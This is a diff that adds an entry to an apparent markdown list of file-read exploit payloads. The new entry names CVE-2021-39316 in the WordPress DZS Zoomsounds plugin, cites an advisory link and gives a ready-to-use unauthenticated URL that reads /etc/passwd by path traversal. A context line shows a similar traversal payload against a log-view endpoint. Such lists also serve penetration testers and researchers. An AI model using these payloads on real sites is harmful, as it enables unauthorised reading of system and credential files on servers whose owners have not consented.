@@ -81,6 +81,13 @@ http://localhost:8887/manage/log/view?filename=/etc/passwd&base=../../../../../
 ```
 
 
+## CVE-2021-39316 WordPress Plugin DZS Zoomsounds 6.45 - Arbitrary File Read (Unauthenticated)
+https://cxsecurity.com/issue/WLB-2021120012
+```
+http://localhost/MYzoomsounds/?action=dzsap_download&link=../../../../../../../../../../etc/passwd
+```
+
+
 
 
 
